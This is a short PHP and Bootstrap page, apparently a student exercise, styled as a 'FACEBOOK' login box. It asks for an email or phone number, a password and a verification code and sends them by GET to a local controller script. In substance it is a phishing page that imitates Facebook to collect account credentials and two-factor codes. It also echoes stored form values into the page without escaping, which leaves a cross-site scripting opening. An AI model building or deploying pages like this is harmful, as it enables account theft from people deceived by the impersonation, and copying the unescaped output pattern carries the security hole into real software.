<?php
session_start();

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
</head>
<body>
    
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="#">Navbar</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav m-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" aria-current="page" href="./hw7_validation">Add account</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" aria-current="page" href="./allpost.php">Create account</a>
                    </li>

                </ul>

            </div>
        </div>
    </nav>
   

    <div class="card col-lg-4 mx-auto mt-5">
        <div class="card-header bg-dark text-light">FACEBOOK</div>

        <div class="card-body">
            <form action="./controller/facebook.php" method="GET">
                <input value="<?= isset($_SESSION['old']['title']) ? $_SESSION['old']['title'] : '' ?>" name="title" class="form-control mt-3" type="text" placeholder="Email and Phone Number">
                
                <?php
                if (isset($_SESSION['form_error']['title_error'])){
                    ?>
                    <span><?= $_SESSION['form_error']['title_error'] ?></span>
                    
                    <?php
                }
                ?>
                

                <textarea name="detail" class="form-control mt-3" placeholder="Your Password"><?= isset($_SESSION['old']['detail']) ? $_SESSION['old']['detail'] : '' ?></textarea>

                <?php
                if (isset($_SESSION['form_error']['detail_error'])){
                    ?>
                    <span><?= $_SESSION['form_error']['detail_error'] ?></span>
                    
                    <?php
                }
                ?>
                

                <input value="<?= isset($_SESSION['old']['author']) ? $_SESSION['old']['author'] : '' ?>"name="author" class="form-control mt-3" type="text" placeholder="Varification Code">
                <?php
                if (isset($_SESSION['form_error']['author_error'])){
                    ?>
                    <span><?= $_SESSION['form_error']['author_error'] ?></span>
                    
                    <?php
                }
                ?>
                
                <button class="btn btn-dark w-100 rounded-0 mt-3">Login</button>
            </form>
        </div>

    </div>
    <div class="toast <?= isset($_SESSION['msg']) ? 'show' : '' ?>" style="position: absolute;right:10px;bottom:80px" role="alert" aria-live="assertive" aria-atomic="true">
  <div class="toast-header">
    
    <strong class="me-auto">Bootstrap</strong>
    <small>just now</small>
    <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
  </div>
  <div class="toast-body">
    <?= isset($_SESSION['msg']) ? $_SESSION['msg'] : '' ?>
  </div>
</div>



</body>
</html>
<?php
session_unset();
?>